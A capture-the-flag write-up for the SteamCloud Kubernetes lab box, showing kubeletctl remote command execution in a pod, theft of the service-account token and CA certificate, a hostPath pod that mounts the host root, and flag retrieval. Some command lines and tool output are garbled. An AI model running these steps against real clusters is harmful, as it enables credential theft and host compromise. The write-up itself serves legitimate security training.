## SteamCloud - Kubernetes Writeup

### Overview
This writeup documents the process of exploiting a Kubernetes cluster and retrieve flags. The target, SteamCloud, is a vulnerable Kubernetes instance with the Kubelet API exposed.

### Reconnaissance

A rapid Nmap scan revealed two open ports:

- SSH (port 22)
- Kubernetes API Server (port 8443)

```bash
nmap -sCV 10.129.96.167

```

The Kubernetes API server was found to be running on port 8443, with the Kubelet API listening on port 10250.

### Enumeration of Kubernetes Resources

By using `kubeletctl`, we could interact with the Kubelet API and list pods running in the cluster.

```bash
.tools -ipts k ube_vic ko bins/
./kubeletctl_linux_amd64 -i --server 10.129.96.167 scan rce

```

```
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2506
                               Node with pods vulnerable to RCE                                   
\u250\u2550\u2550\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    \u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\u25A0\n| 1 \u00c210.129.96.167\u00c3 | kube-apiserver-steamcloud          | kube-system | kube-apiserver          | -   |
\n| 2 \u00c210.129.96.167\u00c3 | kube-controller-manager-steamcloud | kube-system | kube-controller-maanager | -   |
\n| 3 \u00c210.129.96.167\u00c3 | kube-scheduler-steamcloud          | kube-system | kube-scheduler          | -   |
\n| 4 \u00c210.129.96.167\u00c3 | kube-proxy-tkb8w                  | kube-system | kube-proxy             | +   |
\n| 5 \u00c210.129.96.167\u00c3 | storage-provisioner              | kube-system | storage-provisioner     | -   |
\n| 6 \u00c210.129.96.167\u00c3 | coredns-78fcd69978-wqzlj           | kube-system | coredns                 | -   |
\n| 7 \u00c210.129.96.167\u00c3 | nginx                               | default     | nginx                   | +   |
\n| 8 \u00c210.129.96.167\u00c3 | etcd-steamcloud                   | kube-system | etcd                    | -   |
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2506
```

The scan identified two pods that were vulnerable to RCE: `kube-proxy` and `nginx. Since the task required focus on the `default` namespace, the `nginx` pod was the target.

### Obtaining Service Account Credentials

The `kubeletctl` tool was used to execute commands inside the `nginx` pod to retrieve the service account's token and certificate.

```bash
./kubeletctl_linux_amd64 -i --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token.txt

./kubeletctl_linux_amd64 -i --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
```

These credentials were then used to authenticate with the Kubernetes API and create a new pod.

### Creating a Pod with Host Path Mount

A custom Pod definition (`privesc.yaml`) was created to mount the host's root filesystem into the container.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt/root
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

This configuration mounts the host's entire file system to `/mnt/root` within the container, providing read-and-write access to all files on the host.

### Deploying the Pod
The Pod was deployed using `kubectl` on the correct port (8443).

```bash
export server="https://10.129.96.167:8443"
kubectl --token=$token --certificate-authority=ca.crt --server=$server apply -f privesc.yaml
```

### Retrieving the Flags

The newly created `privesc` pod was used to access the host's filesystem and retrieve the flags.

#### Root Flag
```bash
./kubeletctl_linux_amd64 -i --server 10.129.96.167 exec "cat /mnt/root/root/root.txt" -p privesc -c privesc
```

Result:
```
dd3d8234-------ad9895b7b959
```

#### User Flag
```bash
./kubeletctl_linux_amd64 -i --server 10.129.96.167 exec "cat /mnt/root/home/user/user.txt" -p privesc -c privesc
```

Result:

```
1533084------3ba5fe6f71c68b4
```

### Conclusion

The SteamCloud machine was successfully compromised by: 
1. Identifying the `default` namespace pod (`nginx`) that allows RCE
2. Extracting the service account token and certificate
3. Creating a privileged Pod that mounts the host filesystem
4. Retrieving both the root and user flags from the host

This demonstrates the dangers of giving pods root privileges and the importance of securing the Kubernetes API and Kubelet endpoints.
